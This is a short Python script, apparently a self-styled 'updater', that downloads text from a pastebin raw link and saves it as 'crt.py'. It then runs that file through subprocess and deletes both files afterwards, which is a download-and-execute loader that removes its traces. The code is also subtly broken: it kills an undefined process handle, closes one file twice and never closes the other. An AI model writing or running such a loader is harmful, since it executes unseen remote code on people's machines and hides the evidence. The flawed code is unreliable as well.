import re
import requests
from bs4 import BeautifulSoup
import subprocess
import os
def parse(link):
    r = requests.get(link)
    with open('temp_updater.txt', 'w') as f:
        f.write(r.text)
    print('Pass sector: 1')
def createcr(filename):
    filecr = open(filename, 'w')
    filet = open('temp_updater.txt', 'r')
    data = filet.read()
    filecr.write(str(data))
    filet.close()
    filet.close()
    print('Pass sector: 2')
def runs(file):
    h = subprocess.Popen(file)
    print('Pass sector: 3')
def delete(file1,file2):
    os.remove(file1)
    os.remove(file2)
    h.kill()
    print('Pass sector 4')
def maincr(link,filename):
    parse(link)
    createcr(filename)
    runs(filename)
    delete('temp_updater.txt',filename)
    print('Pass sector 5')
maincr('https://pastebin.com/raw/zrUJqrHR','crt.py')